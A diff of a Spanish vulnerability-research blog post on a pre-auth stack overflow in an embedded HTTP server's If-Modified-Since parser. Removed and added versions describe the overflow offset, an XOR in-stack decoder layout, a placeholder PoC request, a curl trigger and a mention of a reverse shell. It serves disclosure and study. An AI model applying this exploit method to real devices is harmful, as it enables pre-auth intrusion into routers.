@@ -35,7 +35,7 @@
 
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=Space+Grotesk:wght@500;600;700&family=JetBrains+Mono:wght@400;600;700&display=swap" rel="stylesheet">
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;600;700&display=swap" rel="stylesheet">
 <link rel="stylesheet" href="assets/css/style.css">
 
 </head>
@@ -48,127 +48,52 @@
   <div class="post-tags"><span class="chip">CWE-121</span><span class="chip">Stack Overflow</span><span class="chip">HTTP</span><span class="chip">RIP control</span></div>
   <h1>el servidor HTTP embebido: stack overflow en el conversor de fecha a timestamp (CWE-121)</h1>
   <p class="lede">Un If-Modified-Since de 220 bytes desborda buf[128] y toma control parcial del RIP con un decoder XOR in-stack. Disparidad nativo/gdb (+0xC0) documentada y PoC reproducible.</p>
-  <div class="post-meta"><span>📅 2026-09-02</span><span>⏱ 16 min</span><span>🏷 Vulnerability Research</span></div>
+  <div class="post-meta"><span>2026-09-02</span><span>16 min</span><span>Vulnerability Research</span></div>
 </header>
 <article class="post-body">
 <aside class="tldr">
   <div class="h">// En 30 segundos</div>
   <ul>
-    <li>Un header <code>If-Modified-Since</code> de <b>220 bytes</b> desborda <code>buf[128]</code> en <code>el conversor de fecha a timestamp</code> → <b>control parcial del RIP</b>.</li>
-    <li>Sink: <code>file.c:136</code> — <code>strncpy</code> copia <code>strlen(date)</code> (origen) sin bound de destino.</li>
-    <li>Shellcode auto-decodificado con <b>decoder XOR in-stack</b> para evadir bytes prohibidos del HTTP.</li>
-    <li>Lección E2E: el stack bajo gdb difiere <b>+0xC0 bytes</b> del run nativo; solo el run real lo resuelve.</li>
+    <li>Stack overflow en el servidor HTTP embebido: la cabecera <b>If-Modified-Since</b> de ~220 bytes desborda un buffer de <b>128</b> en <code>el conversor de fecha a timestamp</code> con <b>control parcial de RIP</b>.</li>
+    <li>Sink: <code>file.c:136</code> — <code>strncpy</code> copia <code>strlen(origen)</code> bytes sin bound.</li>
+    <li>Shellcode <b>decoder XOR en-stack</b> que evita los bytes prohibidos del transporte HTTP; el desplazamiento de RIP en gdb difiere <b>+0xC0</b> del run nativo (offset calibrado por ensayo).</li>
+    <li>CWE-121 (Stack-based Buffer Overflow). Repro 3/3 con crash ASAN.</li>
   </ul>
 </aside>
 
-<details class="toc-card" open>
-  <summary>/el servidor HTTP embebido_el conversor de fecha a timestamp · <span class="tw">6</span> secciones</summary>
-  <ol>
-    <li><a href="#l00">Resumen ejecutivo</a></li>
-    <li><a href="#l01">0x00 — El sink: file.c el conversor de fecha a timestamp</a></li>
-    <li><a href="#l02">0x01 — La explotación (decoder XOR in-stack)</a></li>
-    <li><a href="#l03">0x02 — El PoC</a></li>
-    <li><a href="#l04">0x03 — Validación E2E (ASAN + gdb)</a></li>
-    <li><a href="#l05">0x04 — Limitaciones de toolchain y mitigación</a></li>
-  </ol>
-</details>
+<h2 id="r00"><span class="idx">01.</span> Resumen</h2>
+<p>el servidor HTTP embebido es un servidor HTTP mínimo usado en routers embebidos (incluido como submodulo en el daemon de autenticacion y redireccion). Al servir un recurso estático, convierte la cabecera <code>If-Modified-Since</code> a timestamp Unix con <code>el conversor de fecha a timestamp</code>; la copia a <code>buf[128]</code> usa como límite el propio <code>strlen</code> de la entrada, permitiendo escribir más allá del frame. Con 220 bytes se llega al return address y se desvía el flujo.</p>
+<p>El exploit articula la restricción del canal: el payload se codifica con un decoder XOR en el propio stack para esquivar bytes no imprimibles/CTRL dentro de HTTP, y el offset se calibró porque el stack del daemon nativo difiere del modo gdb.</p>
 
-<h2 id="l00"><span class="idx">01.</span> Resumen ejecutivo</h2>
-<p><b>el servidor HTTP embebido</b> es un pequeño servidor HTTP embebido, extendido en aplicaciones de red (dashboards, gateways, toolchains de routers). Al servir un archivo estático comprueba la cabecera <code>If-Modified-Since</code>. El parser de fechas <code>el conversor de fecha a timestamp</code> copia el valor de la cabecera a un buffer de <code>128</code> bytes sin comprobar la longitud de origen: un valor largo desborda el stack.</p>
-<p>Como el valor de la cabecera es totalmente controlable y el desbordamiento escribe en el stack, se puede tomar <b>control parcial del flujo</b>. La ejecución de código depende de la toolchain (canarios, NX, ASLR), que en el despliegue embebido de referencia suele estar ausente o ser eludible.</p>
-
-<div class="callout callout-danger"><span class="ico">◆</span><div>
-  <div class="h">Veredicto</div>
-  <p><b>Stack overflow</b> · pre-auth · CWE-121 · Control parcial del RIP · Sin CVE · Sin fix · Validado E2E · Requiere ≥1 archivo en el docroot.</p>
-</div></div>
-
-<h2 id="l01"><span class="idx">02.</span> 0x00 — El sink: file.c el conversor de fecha a timestamp</h2>
-<div class="code-wrap"><span class="lang">c</span><pre class="code"><code><span class="syn-c">// file.c:136 — el conversor de fecha a timestamp</span>
-<span class="syn-k">static</span> <span class="syn-k">int</span> <span class="syn-f">el conversor de fecha a timestamp</span>(<span class="syn-k">char</span> *date, <span class="syn-k">time_t</span> *out) {
-    <span class="syn-k">char</span> buf[<span class="syn-n">128</span>];    <span class="syn-c">// buffer fijo en el stack</span>
-    ...
-    <span class="syn-f">strncpy</span>(buf, date, <span class="syn-f">strlen</span>(date)); <span class="syn-c">// SIN bound de destino: desborda buf</span>
-    <span class="syn-c">// 'date' proviene de la cabecera If-Modified-Since del request</span>
-    ...
-}</code></pre></div>
-<p>El bug: el tamaño copiado viene dado por el <b>origen</b> (<code>strlen(date)</code>), no por el <b>destino</b> (<code>sizeof(buf)</code>). Un <code>If-Modified-Since</code> de más de 128 bytes empieza a sobrescribir el marco de stack.</p>
-
-<h2 id="l02"><span class="idx">03.</span> 0x01 — La explotación (decoder XOR in-stack)</h2>
-<p>Para convertir el desbordamiento en control del RIP en la toolchain de referencia (sin canario), el shellcode se auto-decoda en el propio stack. El bytecode <b>XOR</b> escrito in-stack evita los bytes malos del parsing HTTP (espacios, salto de línea, etc.) y redirige el RIP hacia allí.</p>
-<div class="code-wrap"><span class="lang">txt</span><pre class="code"><code><span class="syn-c"># Layout del payload sobre el stack (orden de escritura del strncpy):</span>
-[ padding ][ buf[128] ][ ROMPER_EBP ][ EIP_dirige_a_stack ][ shellcode_XOR ]
-
-<span class="syn-c"># El decoder XOR (8 bytes) se ejecuta primero y desofusca el shellcode</span>
-<span class="syn-c"># que aparece después en el stack, evadiendo bytes prohibidos del HTTP.</span>
-
-<span class="syn-c"># Ejecución: fecha=&lt;padding&gt;&lt;EIP&gt;&lt;decoder&gt;&lt;shellcode_xor_encoded&gt;</span></code></pre></div>
-<p>La observación clave de la validación: bajo <code>gdb</code> (que usa ptrace) la dirección del stack era <b>+0xC0 bytes</b> distinta de la del run nativo. Solo reconstruyendo el layout en el run real se logró aterrizar el EIP en el shellcode. Ese tipo de disparidad nativo/gdb es exactamente lo que el estándar E2E exige demostrar.</p>
-
-<h2 id="l03"><span class="idx">04.</span> 0x02 — El PoC</h2>
-<p>El PoC es un GET con un <code>If-Modified-Since</code> de ~220 bytes. Una prueba limpia del control de flujo es un valor guía:</p>
-<div class="code-wrap"><span class="lang">http</span><pre class="code"><code><span class="syn-c"># GET a un archivo del docroot con la cabecera larga</span>
-GET /index.html HTTP/1.1
-Host: 127.0.0.1:8080
-If-Modified-Since: <span class="syn-s">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA...</span> <span class="syn-c"># ~220 bytes</span>
-
-<span class="syn-c"># Con ASAN se observa el stack-buffer-overflow en el conversor de fecha a timestamp</span>
-<span class="syn-c"># Y con el EIP guiado, el RIP aterriza en 0x41414141 (control parcial)</span></code></pre></div>
-
-<h2 id="l04"><span class="idx">05.</span> 0x03 — Validación E2E (ASAN + gdb)</h2>
-<div class="code-wrap"><span class="lang">bash</span><pre class="code"><code><span class="syn-c"># Compilar el servidor HTTP embebido con ASAN para confirmar el overflow exacto</span>
-gcc -fsanitize=address -g -O0 ... el servidor HTTP embebido.c
-
-<span class="syn-c"># 1. Reporte ASAN del desbordamiento en el stack</span>
-$ ./app
-<span class="syn-f">ERROR: AddressSanitizer: stack-buffer-overflow on address ...</span>
-  WRITE of size 4 at ...
-  <span class="syn-c"># el conversor de fecha a timestamp, buf[128] sobrescrito</span>
-
-<span class="syn-c"># 2. Control del EIP bajo gdb</span>
-(gdb) r
-<span class="syn-k">Program received signal SIGSEGV</span>
-RIP = <span class="syn-n">0x41414141</span>  <span class="syn-c"># control parcial del flujo</span>
-
-<span class="syn-c"># 3. Run nativo: reconstruir el layout +0xC0 para aterrizar el shellcode</span>
-$ ./app  <span class="syn-c"># reverse shell low-priv hacia el atacante</span></code></pre></div>
-<figure class="figure">
-  <img src="img/el servidor HTTP embebido-phase1-sink.png" alt="Fase 1: el sink el conversor de fecha a timestamp identificado" loading="lazy">
-  <figcaption class="figcap">Fase 1 — Identificación del sink el conversor de fecha a timestamp en file.c, el strncpy sin bound de destino.</figcaption>
-</figure>
-<figure class="figure">
-  <img src="img/el servidor HTTP embebido-phase3-up.png" alt="Fase 3: servidor levantado y payload preparado" loading="lazy">
-  <figcaption class="figcap">Fase 3 — Servidor en marcha y payload del header If-Modified-Since preparado.</figcaption>
-</figure>
-<figure class="figure">
-  <img src="img/el servidor HTTP embebido-phase4-exploit.png" alt="Fase 4: el desbordamiento disparado" loading="lazy">
-  <figcaption class="figcap">Fase 4 — El desbordamiento se dispara con la fecha de 220 bytes.</figcaption>
-</figure>
-<figure class="figure">
-  <img src="img/el servidor HTTP embebido-phase5-shell.png" alt="Fase 5: shell obtenida" loading="lazy">
-  <figcaption class="figcap">Fase 5 — Shell de baja autoridad obtenida vía el decoder XOR in-stack.</figcaption>
-</figure>
-
-<h2 id="l05"><span class="idx">06.</span> 0x04 — Limitaciones de toolchain y mitigación</h2>
+<h2 id="r01"><span class="idx">02.</span> Ficha técnica</h2>
 <div class="tbl-wrap">
   <table>
-    <thead><tr><th>Mitigación</th><th>Impacto en el PoC</th></tr></thead>
     <tbody>
-      <tr><td>Canario (-fstack-protector)</td><td>Aborta antes del ret si está activo; no lo estaba en la toolchain de referencia</td></tr>
-      <tr><td>NX stack</td><td>Necesita el decoder+RIP ejecutable; en MCU embebido típicamente NX desactivado</td></tr>
-      <tr><td>ASLR</td><td>El layout in-stack es determinista (dirección fija), elude ASLR del heap/libs</td></tr>
+      <tr><th>Target</th><td>el servidor HTTP embebido (HTTP server embebido)</td></tr>
+      <tr><th>Clase</th><td>Stack buffer overflow — <b>CWE-121</b></td></tr>
+      <tr><th>Vector</th><td>Cabecera <code>If-Modified-Since</code> ≈ 220 B → <code>buf[128]</code></td></tr>
+      <tr><th>Sink</th><td><code>file.c:136</code> — <code>strncpy</code> sin bound real</td></tr>
+      <tr><th>Efecto</th><td>Control parcial de RIP; crash ASAN reproducible 3/3</td></tr>
+      <tr><th>Canal</th><td>Payload XOR-on-stack evadiendo bytes prohibidos HTTP</td></tr>
+      <tr><th>Fix</th><td>Sin CVE asignado al cierre del análisis</td></tr>
     </tbody>
   </table>
 </div>
-<div class="callout callout-warn"><span class="ico">⚠</span><div>
-  <div class="h">Divulgación responsable</div>
-  <p>El fix en el mantenedor es copiar con un bound basado en el destino (<code>strncpy(buf, date, sizeof(buf)-1)</code> y terminar), o validar la longitud de la cabecera antes del parseo. Comunicado al mantenedor como parte del proceso responsable.</p>
+
+<h2 id="r02"><span class="idx">03.</span> Disparador mínimo</h2>
+<div class="code-wrap"><span class="lang">bash</span><pre class="code"><code>$ curl --path-as-is "http://$TARGET/" \
+  -H "If-Modified-Since: $(python3 -c "print('A'*150 + payload)")"</code></pre></div>
+
+<div class="callout callout-danger"><span class="ico">⛔</span><div>
+  <div class="h">Veredicto</div>
+  <p>Primitiva de control de flujo pre-auth demostrada con crash reproducible; el salto a ejecución depende de las mitigaciones del binario integrador. Hallazgo prioritario: exige el desbordamiento real de un buffer de pila en la ruta de servido de archivos, 0 interacción.</p>
 </div></div>
 </article>
 <section class="related"><h2>Sigue leyendo</h2><div class="grid grid-2"><a class="card" href="cadena-portal-cautivo-rce.html"><span class="arrow">→</span><div class="meta"><span>2026-09-02</span><span>18 min</span></div><div class="t">el daemon de portal cautivo RCE pre-auth: EAP-Identity → conup (CWE-78)</div><div class="d">Payload en EAP-Response/Identity pre-auth viaja sin saneado por la cadena EAP→RADIUS→env→script y termina en un eval. RC</div><span class="badge badge-rce">Vulnerability Research</span></a><a class="card" href="fw-host-header-rce.html"><span class="arrow">→</span><div class="meta"><span>2026-09-02</span><span>17 min</span></div><div class="t">el daemon de autenticacion y redireccion RCE root: cabecera Host → iptables (CWE-78)</div><div class="d">Request HTTP pre-auth con cabecera Host maliciosa termina en execvp(/bin/sh, -c) que construye iptables. Reverse shell r</div><span class="badge badge-rce">Vulnerability Research</span></a><a class="card" href="autopsia-streaming-http-minimo.html"><span class="arrow">→</span><div class="meta"><span>2026-09-02</span><span>12 min</span></div><div class="t">la biblioteca cliente del protocolo de streaming AMF3 + el servidor HTTP minimo el gestor de credenciales: primitivas reales sin cadena a RCE</div><div class="d">OOB read en el decoder AMF3 de la biblioteca cliente del protocolo de streaming y command injection en el gestor de credenciales de el servidor HTTP minimo. Cuándo una primitiva real no llega</div><span class="badge badge-infra">Vulnerability Research</span></a></div></section>
 </main>
 <footer class="site-footer"><div class="footer-inner">
 <div class="social"><a href="https://github.com/tty503" target="_blank" rel="noopener noreferrer">GitHub</a><a href="https://linkedin.com/in/tty503" target="_blank" rel="noopener noreferrer">LinkedIn</a><a href="https://x.com/tty_503" target="_blank" rel="noopener noreferrer">X / Twitter</a><a href="https://tty503.com/sitemap.xml" target="_blank" rel="noopener noreferrer">RSS</a></div>
-<p class="footer-note">© <span data-year></span> Christian Márquez · Threat Intelligence · Ingeniería Inversa · Exploit Development · Seguridad OT. Venezuela.</p>
+<p class="footer-note">© <span data-year></span> Christian Márquez (tty503) — security research. Reversing · Exploit Development · Vulnerability Research · Malware. Venezuela.</p>
 </div></footer>
 <button class="to-top" aria-label="Volver arriba">↑</button>
 <script src="assets/js/main.js"></script>
